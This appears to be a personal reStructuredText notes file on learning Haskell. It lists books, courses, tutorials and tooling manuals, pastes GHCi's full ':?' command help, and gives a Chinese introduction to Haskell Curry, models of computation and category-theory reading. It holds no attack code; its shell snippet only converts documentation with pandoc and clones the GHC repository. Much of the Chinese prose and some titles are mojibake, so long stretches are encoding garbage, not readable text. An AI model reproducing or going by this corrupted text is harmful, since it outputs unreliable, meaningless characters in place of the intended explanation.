
===================================================
/. üöÄ ./Documentation
===================================================

`ÂêçÂÆâË£Ö Haskell Âú®Á∫øÁºñËØëÂô® <https://haskell.godbolt.org/>`__


.. code-block::

   #!/usr/bin/env bash
   url=https://learnyouahaskell.com/chapters
   url=https://www.haskell.org/documentation/
   pandoc -r html "$url" -t rst | subl -

   # https://gitlab.haskell.org/ghc/ghc/-/tree/master/docs/users_guide
   git clone --recurse-submodules git@gitlab.haskell.org:ghc/ghc.git

   exit 


.. rubric:: Documentation
  :name: documentation

This page lists various resources to help you with 
Haskell. Resources marked with [$] require payment.

If you are new to Haskell and are not sure where to start from, we recommend
`CIS194 <https://www.seas.upenn.edu/~cis194/spring13/lectures.html>`__.
CIS194 is the introductory Haskell course of the
University of Pennsylvania; it is free, thorough,
practical and will guide you from the basics to advanced
features of the language.

.. rubric:: Introductory Books for Learning Haskell
  :name: introductory-books-for-learning-haskell

-  `Learn You a Haskell for Great Good! <http://learnyouahaskell.com/>`__
-  `Real World Haskell <http://book.realworldhaskell.org/>`__
-  `Learn Haskell by building a blog generator <https://learn-haskell.blog>`__
-  [$] `Haskell from the Very Beginning <https://www.haskellfromtheverybeginning.com/>`__
-  [$] `Haskell Programming from first principles <http://haskellbook.com>`__
-  [$] `Thinking Functionally with Haskell <http://www.cambridge.org/us/academic/subjects/computer-science/programming-languages-and-applied-logic/thinking-functionally-haskell>`__
-  [$] `Programming in Haskell <http://www.cs.nott.ac.uk/~pszgmh/pih.html>`__
-  [$] `Haskell: The Craft of Functional Programming <http://www.haskellcraft.com/craft3e/Home.html>`__
-  [$] `The Haskell School of Music <http://euterpea.com/haskell-school-of-music/>`__
-  [$] `Get Programming with Haskell <https://www.manning.com/books/get-programming-with-haskell>`__
-  [$] `Effective Haskell <https://www.pragprog.com/titles/rshaskell/effective-haskell/>`__
-  [$] `Haskell: Uma introduËéΩËå´o ËÑø programaËéΩËå´o funcional (PT-BR) <https://www.casadocodigo.com.br/products/livro-haskell>`__
-  [$] `Learn Physics with Functional Programming: A Hands-on Guide to Exploring Physics with Haskell <https://lpfp.io/>`__

.. rubric:: Intermediate Haskell Books
  :name: intermediate-haskell-books

-  `Developing Web Applications with Haskell and Yesod <http://www.yesodweb.com/book>`__
-  `Parallel and Concurrent Programming in Haskell <https://simonmar.github.io/pages/pcph.html>`__
-  [$] `Functional Design and Architecture <https://www.manning.com/books/functional-design-and-architecture>`__
-  [$] `Haskell in Depth <https://www.manning.com/books/haskell-in-depth>`__
-  [$] `Practical Haskell <https://www.apress.com/gp/book/9781484244791>`__
-  [$] `Production Haskell <https://leanpub.com/production-haskell>`__

.. rubric:: Courses
  :name: courses

Course material created by instructors 

-  `University of Pennsylvania's CIS 194 <https://www.seas.upenn.edu/~cis1940/spring13/>`__
-  `Data61 Functional Programming Course <https://github.com/data61/fp-course>`__
-  `Stanford's cs240h <http://www.scs.stanford.edu/14sp-cs240h/>`__
-  `Hendrix's CSCI 360 <http://ozark.hendrix.edu/~yorgey/360/f16/>`__
-  `University of Helsinki's Haskell MOOC <https://haskell.mooc.fi/>`__
-  `University of Nottingham's introductory Haskell course <http://www.cs.nott.ac.uk/~pszgmh/pgp.html>`__
-  `University of Nottingham's advanced Haskell course <http://www.cs.nott.ac.uk/~pszgmh/afp.html>`__

.. rubric:: Tutorials
  :name: tutorials

Short, dense, classic ways to hit the ground running 

-  `A Gentle Introduction to Haskell <https://www.haskell.org/tutorial/>`__
-  `Happy Learn Haskell Tutorial <https://www.happylearnhaskelltutorial.com/>`__
-  `Yet Another Haskell Tutorial <http://en.wikibooks.org/wiki/Haskell/YAHT/Preamble>`__
-  `Write Yourself a Scheme in 48 Hours <http://en.wikibooks.org/wiki/Write_Yourself_a_Scheme_in_48_Hours>`__
-  `Write Yourself a Scheme 2.0 <https://wespiser.com/writings/wyas/home.html>`__
-  `Learning Haskell <http://learn.hfm.io>`__
-  `Haskell Beginners Course 2022 <https://github.com/haskell-beginners-2022/course-plan>`__

.. rubric:: Online Resources
  :name: online-resources

Curated resources put together by Haskellers: 

-  `The Haskell Wiki <http://wiki.haskell.org>`__
-  `The Haskell Wikibook <http://en.wikibooks.org/wiki/Haskell>`__
-  `FP Complete's School of Haskell <https://www.schoolofhaskell.com/>`__
-  `Stephen Diehl's What I Wish I Knew When Learning Haskell <https://web.archive.org/web/20220513191346/http://dev.stephendiehl.com/hask/>`__
-  `Chris Allen's List of Learning Haskell Resources <https://github.com/bitemyapp/learnhaskell>`__
-  `Bob Ippolito's Getting Started with Haskell <http://bob.ippoli.to/archives/2013/01/11/getting-started-with-haskell/>`__
-  `Albert Y.C. Lai's Haskell Notes and Examples <http://www.vex.net/~trebla/haskell/index.xhtml>`__
-  `Learning Haskell Resources on the Haskell Wiki <https://wiki.haskell.org/Learning_Haskell>`__

.. rubric:: Manuals and Guides
  :name: manuals-and-guides

Manuals and guides that cover common Haskell tooling: 

-  `GHC User's Guide <http://www.haskell.org/ghc/docs/latest/html/users_guide/>`__
-  `Cabal Homepage And Quick Links <https://www.haskell.org/cabal/>`__
-  `Cabal User Guide <http://www.haskell.org/cabal/users-guide/>`__
-  `Stack User Guide <https://docs.haskellstack.org/>`__ 
-  `Haddock User Guide <https://haskell-haddock.readthedocs.io/>`__
-  `Haskeleton: A Haskell Project Skeleton <http://taylor.fausak.me/2014/03/04/haskeleton-a-haskell-project-skeleton/>`__
-  `How to Write a Haskell Program <https://wiki.haskell.org/How_to_write_a_Haskell_program>`__

.. rubric:: Package and Dependency Management
  :name: package-and-dependency-management

The Cabal guide is a good start but there's a lot to learn:

-  `Stephen Diehl's Cabal Quickstart <https://web.archive.org/web/20220513191346/http://dev.stephendiehl.com/hask/#cabal>`__
-  `The Storage and Interpretation of Cabal Packages <http://www.vex.net/~trebla/haskell/sicp.xhtml>`__
-  `The Cabal of Cabal <http://www.vex.net/~trebla/haskell/cabal-cabal.xhtml>`__

.. rubric:: Library Documentation
  :name: library-documentation

Documentation for Haskell libraries is typically 
available on Hackage. We also have specialized tools for
searching across it, not only by name, but by type.

-  `Hoogle API Search <http://www.haskell.org/hoogle/>`__
-  `Hackage <http://hackage.haskell.org/>`__
-  `Stackage (with API Search) <https://www.stackage.org>`__
-  `The Typeclassopedia <https://wiki.haskell.org/Typeclassopedia>`__
-  `Haddocks for Libraries included with GHC <https://downloads.haskell.org/~ghc/latest/docs/html/libraries/index.html>`__

.. rubric:: Language Report
  :name: language-report

The Haskell 2010 language report is available online as 
`HTML <https://haskell.org/onlinereport/haskell2010/>`__
and as
`PDF <https://haskell.org/definition/haskell2010.pdf>`__.
The `source is available on GitHub <https://github.com/haskell/haskell-report>`__.
The differences between GHC and the report can be found
`in the GHC User's Guide <http://www.haskell.org/ghc/docs/latest/html/users_guide/bugs.html#haskell-standards-vs-glasgow-haskell-language-non-compliance>`__.




================================
/GHCI - command-line interpreter
================================

.. container::

   Usage:

       ghci [command-line-options-and-input-files]

   The kinds of input files that can be given on the command-line
   include:

     - Haskell source files (.hs or .lhs suffix)
     - Object files (.o suffix, or .obj on Windows)
     - Dynamic libraries (.so suffix, or .dll on Windows)

   In addition, ghci accepts most of the command-line options that plain
   GHC does.  Some of the options that are commonly used are:

       -i<dir>         Search for imported modules in the directory <dir>.

       -H32m       Increase GHC's default heap size to 32m

       -cpp            Enable CPP processing of source files

   Full details can be found in the User's Guide, an online copy of which
   can be found here:

       http://www.haskell.org/ghc/docs/latest/html/users_guide/

   If you *really* want to see every option, then you can pass
   '--show-options' to ghci.

.. container::

   ghci> :?
    Commands available from the prompt:

      <statement>                 evaluate/run <statement>
      :                           repeat last command
      :{\n ..lines.. \n:}\n       multiline command
      :add [*]<module> ...        add module(s) to the current target set
      :browse[!] [[*]<mod>]       display the names defined by module <mod>
                                  (!: more details; *: all top-level names)
      :cd <dir>                   change directory to <dir>
      :cmd <expr>                 run the commands returned by <expr>::IO String
      :complete <dom> [<rng>] <s> list completions for partial input string
      :ctags[!] [<file>]          create tags file <file> for Vi (default: "tags")
                                  (!: use regex instead of line number)
      :def[!] <cmd> <expr>        define command :<cmd> (later defined command has
                                  precedence, ::<cmd> is always a builtin command)
                                  (!: redefine an existing command name)
      :doc <name>                 display docs for the given name (experimental)
      :edit <file>                edit file
      :edit                       edit last module
      :etags [<file>]             create tags file <file> for Emacs (default: "TAGS")
      :help, :?                   display this list of commands
      :info[!] [<name> ...]       display information about the given names
                                  (!: do not filter instances)
      :instances <type>           display the class instances available for <type>
      :issafe [<mod>]             display safe haskell information of module <mod>
      :kind[!] <type>             show the kind of <type>
                                  (!: also print the normalised type)
      :load[!] [*]<module> ...    load module(s) and their dependents
                                  (!: defer type errors)
      :main [<arguments> ...]     run the main function with the given arguments
      :module [+/-] [*]<mod> ...  set the context for expression evaluation
      :quit                       exit GHCi
      :reload[!]                  reload the current module set
                                  (!: defer type errors)
      :run function [<arguments> ...] run the function with the given arguments
      :script <file>              run the script <file>
      :type <expr>                show the type of <expr>
      :type +d <expr>             show the type of <expr>, defaulting type variables
      :unadd <module> ...         remove module(s) from the current target set
      :undef <cmd>                undefine user-defined command :<cmd>
      ::<cmd>                     run the builtin command
      :!<command>                 run the shell command <command>

    -- Commands for debugging:

      :abandon                    at a breakpoint, abandon current computation
      :back [<n>]                 go back in the history N steps (after :trace)
      :break [<mod>] <l> [<col>]  set a breakpoint at the specified location
      :break <name>               set a breakpoint on the specified function
      :continue [<count>]         resume after a breakpoint [and set break ignore count]
      :delete <number> ...        delete the specified breakpoints
      :delete *                   delete all breakpoints
      :disable <number> ...       disable the specified breakpoints
      :disable *                  disable all breakpoints
      :enable <number> ...        enable the specified breakpoints
      :enable *                   enable all breakpoints
      :force <expr>               print <expr>, forcing unevaluated parts
      :forward [<n>]              go forward in the history N step s(after :back)
      :history [<n>]              after :trace, show the execution history
      :ignore <breaknum> <count>  for break <breaknum> set break ignore <count>
      :list                       show the source code around current breakpoint
      :list <identifier>          show the source code for <identifier>
      :list [<module>] <line>     show the source code around line number <line>
      :print [<name> ...]         show a value without forcing its computation
      :sprint [<name> ...]        simplified version of :print
      :step                       single-step after stopping at a breakpoint
      :step <expr>                single-step into <expr>
      :steplocal                  single-step within the current top-level binding
      :stepmodule                 single-step restricted to the current module
      :trace                      trace after stopping at a breakpoint
      :trace <expr>               evaluate <expr> with tracing on (see :history)

    -- Commands for changing settings:

      :set <option> ...           set options
      :seti <option> ...          set options for interactive evaluation only
      :set local-config { source | ignore }
                                  set whether to source .ghci in current dir
                                  (loading untrusted config is a security issue)
      :set args <arg> ...         set the arguments returned by System.Environment.getArgs
      :set prog <progname>        set the value returned by System.Environment.getProgName
      :set prompt <prompt>        set the prompt used in GHCi
      :set prompt-cont <prompt>   set the continuation prompt used in GHCi
      :set prompt-function <expr> set the function to handle the prompt
      :set prompt-cont-function <expr>
                                  set the function to handle the continuation prompt
      :set editor <cmd>           set the command used for :edit
      :set stop [<n>] <cmd>       set the command to run when a breakpoint is hit
      :unset <option> ...         unset options

     Options for ':set' and ':unset':

       +m            allow multiline commands
       +r            revert top-level expressions after each evaluation
       +s            print timing/memory stats after each evaluation
       +t            print type after evaluation
       +c            collect type/location info after loading modules
       -<flags>      most GHC command line flags can also be set here
                            (eg. -v2, -XFlexibleInstances, etc.)
                       for GHCi-specific flags, see User's Guide,
                       Flag reference, Interactive-mode options

    -- Commands for displaying information:

      :show bindings              show the current bindings made at the prompt
      :show breaks                show the active breakpoints
      :show context               show the breakpoint context
      :show imports               show the current imports
      :show linker                show current linker state
      :show modules               show the currently loaded modules
      :show packages              show the currently active package flags
      :show paths                 show the currently active search paths
      :show language              show the currently active language flags
      :show targets               show the current set of targets
      :show <setting>             show value of <setting>, which is one of
                                     [args, prog, editor, stop]
      :showi language             show language flags for interactive evaluation

    The User's Guide has more information. An online copy can be found here:

      https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/ghci.html


=======================================
/Category TheoryÔºöÊï≤ÂºÄ Haskell ÁÆ≠Â§¥ÁöÑÂ§ßÈó®
=======================================

.. container::

   Haskell Brooks CurryÔºàÂìàÊñØÂáØÂ∞î¬∑ÁßëÈáåÔºå1900-1982ÔºâÔºåÁæéÂõΩÊï∞Â≠¶ÂÆ∂„ÄÅÈÄªËæëÂ≠¶ÂÆ∂ÔºåÊï∞ÁêÜÈÄªËæëÂíåËÆ°ÁÆóÊú∫
   ÁßëÂ≠¶ÂéÜÂè≤‰∏äÈáåÁ®ãÁ¢ëÂºèÁöÑÂ≠òÂú®ÔºåÂÖ∂ÂêçÂ£∞‰∏çÂ¶ÇÈòøÂÖ∞¬∑ÂõæÁÅµÈÇ£‰πàÂìç‰∫ÆÔºåÂÖ∂ÂΩ±Âìç‰∏çÂ¶ÇÂ∫ìÂ∞îÁâπ¬∑Âì•Âæ∑Â∞îÈÇ£‰πàÂπøÊ≥õÔºå‰ΩÜÊòØÔºå
   Curry ÂØπÁöÑ‰∫∫Á±ªÂéÜÂè≤ÁöÑË¥°ÁåÆÂÆåÂÖ®ÂèØ‰ª•ÂíåÂâçËÄÖÊØîËÇ©„ÄÇÂ¶ÇÊûúËØ¥ÂõæÁÅµÊú∫ÊòØÁé∞‰ª£ËÆ°ÁÆóÊú∫Á®ãÂ∫èËÆæËÆ°ËØ≠Ë®ÄÁöÑÂü∫Êú¨Ê®°ÂûãÔºå
   ÈÇ£‰πàÂèØËÆ°ÁÆóÂáΩÊï∞Â∞±ÊòØÂíåÂõæÁÅµÊú∫Á≠â‰ª∑ÁöÑÂè¶‰∏ÄÁßçÊ®°Âûã„ÄÇÂΩìÂâçÊµÅË°åÁöÑ‰∏òÂ•áÁöÑ Œª-ÊºîÁÆó Ê®°ÂûãÔºåÂÖ∂Âä®Êú∫Â∞±ÊòØÂáΩÊï∞Âºè
   ÁºñÁ®ãÊ®°ÂºèÁöÑÂÖ¥Ëµ∑„ÄÇËÄåÊüØÈáåÁöÑÁªÑÂêàÈÄªËæëÔºå‰Ωú‰∏∫ Œª-ÊºîÁÆó ÁöÑÁ≠â‰ª∑ÔºåÂú®Êüê‰∫õÊñπÈù¢ÊØîÂêéËÄÖÊõ¥‰∏∫Ê¥óÁªÉ„ÄÅ‰ºòÈõÖ„ÄÇÂΩì‰ªäÔºå
   Êúâ‰∏âÁßçÁºñÁ®ãËØ≠Ë®Ä‰ª•‰ªñÁöÑÂêçÂ≠óÂëΩÂêç: Haskell„ÄÅ Brooks Âíå Curry„ÄÇ‰∏∫‰∫ÜÁ∫™Âøµ‰ªñÔºåÂ∞Ü‰∏Ä‰∏™Â§öÂèÇÊï∞ÂáΩÊï∞
   ËΩ¨Êç¢‰∏∫ÂçïÂèÇÊï∞ÂáΩÊï∞Â∫èÂàóÁöÑÊäÄÊúØÁß∞‰∏∫ÊüØÈáåÂåñÔºàCurrying)„ÄÇ

   Abstract Computing Machines: A Lambda Calculus Perspective (by Werner Klugew)
   ‰∏Ä‰π¶ÊÄªÁªì‰∫Ü 1930-1940 Âπ¥‰ª£Âú®ÂèØËÆ°ÁÆóÊÄßÔºàcomputabilityÔºâÁ†îÁ©∂ÊñπÈù¢ÁöÑÂá†ÁßçÊäΩË±°ËÆ°ÁÆóÊú∫Ê®°ÂûãÔºö

      1. ÈòøÂÖ∞¬∑ÂõæÁÅµÁöÑÂõæÁÅµÊú∫Ê®°ÂûãÔºàTuring machineÔºâ
      2. ‰∏òÂ•áÁöÑŒª-ÊºîÁÆóÊ®°ÂûãÔºàŒª-calculusÔºâ
      3. ÂÖãÈáåÂ∞ºÁöÑÈÄíÂΩíÂáΩÊï∞Ê®°ÂûãÔºàKleene‚Äôs recursive functionsÔºâ
      4. Sch√∂nfinkel ÂíåÊüØÈáåÁöÑÁªÑÂêàÈÄªËæëÊ®°ÂûãÔºàSch√∂nfinkel‚Äôs and Curry‚Äôs combinatorsÔºâ
      5. Ê≥¢ÊñØÁâπÁöÑ‰∫ßÁîüÂºèÁ≥ªÁªüÔºàEmil Post's production systemsÔºâÔºà‰πîÂßÜÊñØÂü∫ÁîüÊàêËØ≠Ê≥ïÂΩ¢ÂºèÂåñÈÉ®ÂàÜÁöÑÂéüÂûãÔºâ
      6. È©¨Â∞îÁßëÂ§´ÁÆóÊ≥ïÔºàMarkov algorithmsÔºâÔºà‰∏ÄÁßçÁ±ª‰ººÂâçËÄÖÁöÑÂ≠ó‰∏≤ÈáçÂÜôÁîüÊàêÂºèÁ≥ªÁªüÔºâ

   Haskell Ê∂âÂèäÂ§ßÈáèÊï∞Â≠¶ÊúØËØ≠ÔºåÂØπ‰∫éÊ≤°ÊúâÊï∞Â≠¶ËÉåÊôØÁöÑËØªËÄÖÔºåÂèØËÉΩÂ≠òÂú®ËØª‰∏çÊáÇÊñáÊ°£ÁöÑÈóÆÈ¢ò„ÄÇÂπ∂‰∏îÔºåÂÉèÁ¨îËÄÖËøôÊ†∑
   ÈùûÊï∞Â≠¶‰∏ì‰∏ö„ÄÅÁ¶ªÂºÄÂ§ßÂ≠¶Â∞±ÂÜ∞Â∞ÅÊï∞Â≠¶ÁöÑÊ∞¥Âπ≥ÔºåÁõ¥Êé•ÈòÖËØª‚ÄúÊÄÅÂ∞Ñ‚ÄùËøô‰∏ÄÊ¶ÇÂøµÈÉΩÊúâÂõ∞Èöæ„ÄÇÊÄÅÂ∞ÑÊòØËåÉÁï¥ËÆ∫ÁöÑÊ†∏ÂøÉÊ¶ÇÂøµÔºå
   ‰πüÊòØ Haskell ËØ≠Ë®ÄÁöÑÂü∫Á°ÄÁªìÊûÑÔºö

      ÊÄÅÂ∞ÑÔºàmorphismÔºâÊòØÂú®Êï∞Â≠¶‰∏≠ÊòØÊåá‰∏§‰∏™Êï∞Â≠¶ÁªìÊûÑ‰πãÈó¥‰øùÊåÅÁªìÊûÑÁöÑ‰∏ÄÁßçÊò†Â∞Ñ„ÄÇ

   ËøôÊòØÂæàÁÆÄÂçïÁöÑ‰∏Ä‰∏™ÂÆö‰πâÔºåÊØè‰∏™Ê±âÂ≠óÊàñÂçïËØç‰Ω†ÈÉΩËÆ§ËØÜÔºå‰ΩÜÊòØÁªÑÂêàÂà∞‰∏ÄËµ∑‰Ω†Â∞±ÊòØ‰∏çÊáÇÂú®ËØ¥‰ªÄ‰πà„ÄÇÊó†ÂÆÉÔºåÊäΩË±°Â∫üËØùÂ∞îÔºÅ
   ‰∏Ä‰∏™‰∫ãÁâ©‰πãÊâÄ‰ª•‰ºöÂΩ¢ÊàêÊäΩË±°ÁöÑÊÑüËßâÔºåÊ†πÊú¨Âú®‰∫é‰Ω†Áº∫Â∞ëÁõ∏ÂÖ≥ÁöÑÂâçÁΩÆÁü•ËØÜÔºå‰øóÁß∞Âü∫Á°Ä‰∏çÁâ¢„ÄÇÈÄöÂ∏∏ËøôÁßçÈóÆÈ¢òÈ¶ñÂÖàËß£ÂÜ≥
   ÊñπÊ≥ïÊòØÂêë‚ÄúÂéÜÂè≤ËÄÅÂ∏à‚ÄùËØ∑Êïô„ÄÇËøô‰∏™ÂéÜÂè≤ËÄÅÂ∏àÊâì‰∫ÜÂèåÂºïÔºåÂõ†‰∏∫ÂÆÉ‰∏çÊòØ‰∏Ä‰∏™‰∫∫ÔºåËÄåÊòØ‰∏ÄÂ†Ü‰∫∫Âú®ÁâπÂÆöÈ¢ÜÂüüÊé¢Á¥¢ÁöÑÈÅìË∑Ø„ÄÇ
   ËøôÈáåÁöÑÂéÜÂè≤ËÄÅÂ∏àÊòæÁÑ∂Â∞±ÊòØÊï∞Â≠¶ÁöÑÂéÜÂè≤„ÄÇ‰∫∫Á±ªÊØè‰∏Ä‰∏™Áü•ËØÜÁÇπÂèØËÉΩÊòØÂâç‰∫∫ÁªèÂπ¥Á¥ØÊúàÁöÑÁ†îÁ©∂ÊâçËææÊàêÁöÑÔºåËÄå‰Ω†Ë¶ÅÂá†ÂàÜÈíü
   ÊàñËÄÖÂá†Â∞èÊó∂„ÄÅÂá†Â§©ÁöÑÊó∂Èó¥ÊéåÊè°ÂÆÉÔºåÊòæÁÑ∂‰∏çÊòØ‰∏Ä‰ª∂ËΩªÊùæÁöÑ‰∫ã„ÄÇÊï∞Â≠¶Êú¨Ë∫´Â∞±ÊòØÊäΩË±°ÁöÑÁßëÂ≠¶ÔºåÈÄöËøáÂ≠¶‰π†Ââç‰∫∫Âú®Êï∞Â≠¶
   ËøõÂåñÈÅìË∑Ø‰∏äÂΩ¢ÊàêÁöÑÊäΩË±°ËßÇÂøµÔºåÊòæÂæóÈùûÂ∏∏ÈáçË¶ÅÔºåÁâπÂà´ÂØπËøòÊ≤°ÊúâÂΩ¢ÊàêÂº∫Â§ßÊï∞Â≠¶ÊäΩË±°ËÉΩÂäõÁöÑ‰∫∫„ÄÇ

   ‰ª•‰∏ãÊòØÊñ∞ÊâãÂª∫ËÆÆÔºåÊòæÁÑ∂ÈòÖËØªËøô‰∫õÊïôÊùêÊòØÊúâÂâçÁΩÆÂü∫Á°ÄË¶ÅÊ±ÇÁöÑÔºåÊØïÁ´üÊòØÈÄöÁî®ÊïôÊùêÔºåÂπ∂ÈùûÂü∫‰∫é‰∏™‰∫∫Ê∞¥Âπ≥ÂÆöÂà∂„ÄÇ
   Âõ†Ê≠§ÔºåÊï¥ÁêÜÂá∫‰∏Ä‰ªΩÂ±û‰∫éËá™Â∑±ÁöÑÁ¨îËÆ∞Â∞±ÊòØ‰∏∫Ëá™Â∑±ÂÆöÂà∂ÁöÑ‚ÄúÊïôÊùê‚ÄùÔºö

   *  ‰∫ÜËß£Êï∞Â≠¶ÁöÑÂèëÂ±ïÂè≤ÔºåÂ≠¶‰π†ÊäΩË±°‰ª£Êï∞„ÄÇÊúâËøô‰πàÂá†‰∏™Â•ΩÂ§ÑÔºö
      ‰∏Ä„ÄÅÁªôËåÉÁï¥ËÆ∫Êèê‰æõËÆ∏Â§ö‰æãÂ≠êÔºõ
      ‰∫å„ÄÅÈîªÁÇº‰π¶ÂÜôËØÅÊòéÁöÑËÉΩÂäõÔºõ
      ‰∏â„ÄÅÂèØÈáçÊñ∞ÁêÜËß£ËÆ∏Â§öÂ∏∏Áî®Â∑•ÂÖ∑ÔºåÂ¶ÇÁ∫øÊÄß‰ª£Êï∞„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåÂ≠¶‰∏ÄÁÇπÂü∫Á°ÄÁöÑÁæ§ËÆ∫„ÄÅÁéØËÆ∫ÔºàÂèØÁ∫¶ÊÄßÔºâ„ÄÅÊ®°Â∞±Â§ü‰∫Ü„ÄÇ

   *  Â≠¶‰π†‰ª£Êï∞ÊãìÊâë„ÄÇ‰ª£Êï∞ÊãìÊâëÊòØËåÉÁï¥ËÆ∫ÁöÑÂèëÊ∫êÂú∞„ÄÇ
      ‰∫∫‰ª¨ÂèëÁé∞ÔºåÁ©∫Èó¥ÔºåÊØîÂ¶ÇËØ¥ÁêÉÈù¢ÊàñËÄÖÁîúÁîúÂúàË°®Èù¢‰∏äÁöÑÁéØÂíåÁæ§Â≠òÂú®ÂÖ≥ËÅî„ÄÇ
      ‰∏æ‰∏™‰æãÂ≠êÔºåÁªïÁùÄ‰∏Ä‰∏™ÂúÜÁéØÁöÑÈ¶ñÂ∞æÁõ∏ËøûÁöÑË∑ØÂæÑÔºåÂèØ‰ª•Ê†πÊçÆÁªïÂúÜÁéØÁöÑÂúàÊï∞ËøõË°åÂàÜÁ±ªÔºåÂêéËÄÖ‰∏éÊï¥Êï∞ÈõÜÂêåÊûÑ„ÄÇ
      ËøôÂ∞±ÊòØ‰∏Ä‰∏™Áî±ÊãìÊâëÁ©∫Èó¥ËåÉÁï¥Âà∞Áæ§ËåÉÁï¥‰∏äÁöÑÂáΩÂ≠ê„ÄÇËøô‰∫õÂáΩÂ≠êÂèØÊØî Maybe ÊúâË∂£ÁöÑÂ§ö„ÄÇ

   *  ÊïôÊùêÂèäÈòÖËØªÊùêÊñôÔºö

      Algebraic Topology by Allen Hatcher ‚Äú‰∏ÄÊú¨ÂÜôÁöÑÂÉèÊï∞Â≠¶‰π¶ÁöÑÔºàÂ§öÂõæÔºâÊùÇÂøó„ÄÇ‚Äù
      https://pi.math.cornell.edu/~hatcher/AT/AT+.pdf

      ‰ª£Êï∞ÊãìÊâë ÂçóÂºÄÂ§ßÂ≠¶ ÁéãÂêëÂÜõ
      https://www.bilibili.com/video/BV1aJ411J7ji/

      Contemporary Abstract Algebra NINTH EDITION Joseph A. Gallian

      ÊúÄÂêéÔºå‰∏çË¶ÅÂ≠¶ÂêåË∞É‰ª£Êï∞ÔºÅ‰∏çË¶ÅÂ≠¶ÂêåË∞É‰ª£Êï∞ÔºÅ‰∏çË¶ÅÂ≠¶ HomologyÔºÅ

      `Âú®Êï∞Â≠¶ÁöÑÊµ∑Ê¥ã‰∏≠È£òËç° - MITËÆ°ÁÆóÊú∫ËßÜËßâ‰∏ì‰∏öÊûóËææÂçé <https://dahuasky.wordpress.com/2009/01/22/Âú®Êï∞Â≠¶ÁöÑÊµ∑Ê¥ã‰∏≠È£òËç°/>`__

      `Branches of Mathematics: Arithmetic, Algebra, Geometry, Calculus, Trigonometry, Topology, Probability and Statistics <https://leverageedu.com/blog/branches-of-mathematics/>`__

      `Type Theory <https://plato.stanford.edu/entries/type-theory/>`__

      `Constructive Type Theory <https://plato.stanford.edu/entries/type-theory-intuitionistic>`__

      `Intuitionistic Type Theory <https://plato.stanford.edu/entries/type-theory-intuitionistic>`__

      `A Sensible Introduction to Category Theory <https://www.bilibili.com/list/1801761269>`__

      `Category Theory <https://plato.stanford.edu/entries/category-theory>`__

      `Category Theory for Computing Science by Michael Barr Charles Wells (Revised edition, 1999) <https://www.math.mcgill.ca/barr/papers/ctcs.pdf>`__

      `Type Theory and Functional Programming - Simon Thompson <https://www.cs.kent.ac.uk/people/staff/sjt/TTFP/ttfp.pdf>`__

      `Introduction to Logic - Harry J. Gensler <https://pan.baidu.com/s/1g-HiWTtFkzmJGJCu_wcYBQ?pwd=1kq0>`__

      `Categories Great and Small by Bartosz Milewski <https://bartoszmilewski.com/2014/12/05/categories-great-and-small/>`__

   ‰º†ÁªüÁ®ãÂ∫èËØ≠Ë®Ä‰∏éÂáΩÊï∞ÂºèËØ≠Ë®ÄÁöÑÂå∫Âà´Âú®‰∫éÊåá‰ª§ÂºèÔºàImperativeÔºâ‰∏éÂ£∞ÊòéÂºèÔºàdeclarativeÔºâÔºö

   *  ‚ÄúConventional‚Äù program structure: Imperative
      ‚óã Java, C, Python‚Ä¶
      ‚óã Describe ‚Äúhow‚Äù program does something
      ‚óã program is series of steps (control flow)
      ‚ñ† For loops, if/then...
      ‚óè Alternative: Declarative

   *  Functional languages typically declarative
      ‚ñ† Haskell
      ‚óã Describe logic but don‚Äôt describe control flow
      ‚ñ† Functions, recursion...

   ÂëΩ‰ª§ÂºèËØ≠Ë®ÄÂü∫Êú¨ÊÄùÁª¥ÊòØÔºöËøô‰∏™‰ª£Á†Å/ÂáΩÊï∞Ë¶ÅÂÅö‰ªÄ‰πàÔºüÂ£∞ÊòéÂºèËØ≠Ë®ÄÁöÑÂü∫Êú¨ÊÄùÁª¥ÊòØÔºöËøô‰∏™‰ª£Á†Å/ÂáΩÊï∞ÊòØ‰ªÄ‰πàÔºü

   Stanford's cs240h ÂÖ¨ÂºÄËØæÁ®ãÁöÑËØæ‰ª∂‰∏≠ Lecture 1 Basics ÂæàÂÖ®Èù¢Âú∞‰ªãÁªç‰∫Ü Haskell Á∫ØÂáΩÊï∞Âºè
   ÁºñÁ®ã‰∏é‰º†ÁªüÂëΩ‰ª§ÂºèËØ≠Ë®ÄÁöÑÂ∑ÆÂà´„ÄÇËÆ≤ËØæÊïôÊéàÂåÖÊã¨ Readl World Haskell ‰∏Ä‰π¶‰ΩúËÄÖ„ÄÇ

   Haskell ÊòØÁ∫ØÂáΩÊï∞ (Pure Function) ËØ≠Ë®ÄÔºåÁ∫ØÂáΩÊï∞Ëøô‰∏™Ê¶ÇÂøµÊòØÊåáÔºöÁõ∏ÂêåÁöÑËæìÂÖ•ÔºåÁ∫ØÂáΩÊï∞‰ºöËøîÂõûÁõ∏ÂêåÂÄº„ÄÇ
   ËøôÁßçÊÄßË¥®Áß∞‰∏∫Êó†ÂâØ‰ΩúÁî®Ôºàside effects freeÔºâ„ÄÇ


   GHCI_ ‰∏≠‰∫§‰∫íÂºèËß£ÈáäÂô®Ôºå‚Äúi‚Äù Âç≥‰ª£Ë°® ‚ÄúInteractive‚ÄùÔºåÂÆÉÂèØ‰ª•ÊâßË°å‰ª•‰∏ãÂäüËÉΩÔºõ

   1. interactively evaluate Haskell expressions
   2. interpret Haskell programs
   3. load GHC-compiled modules.

   GHCI_ ‰∫§‰∫íËß£ÈáäÂô®‰∏≠Êï≤ÂÖ•Â§öË°å‰ª£Á†ÅÊó∂Ôºå``:{`` Âíå ``:}`` Á¨¶Âè∑ÂåÖÊã¨Â§öÈÄâ‰ª£Á†Å„ÄÇ
   ‰πüÂèØ‰ª•‰ΩøÁî® ``:set +m`` ÈÖçÁΩÆÊâìÂºÄÂ§öË°åËæìÂÖ•Ê®°Âºè„ÄÇ‰ΩøÁî® ``:?`` Êü•ÁúãÁõ∏ÂÖ≥ÂëΩ‰ª§Â∏ÆÂä©‰ø°ÊÅØ„ÄÇ
   Windows Á≥ªÁªü CTRL-D ËæìÂÖ•ÁöÑÊòØ EOTÔºåCTRL-Z ÊâçÂíå Linux Á≥ªÁªü CTRL-D ‰∏ÄÊ†∑ËæìÂÖ• EOF„ÄÇ

   .. code-block:: haskell

      ghci> :{
         let  {  y   = a*b
              ; f x = (x+y)/y
              }
         in f c + f d
      :}

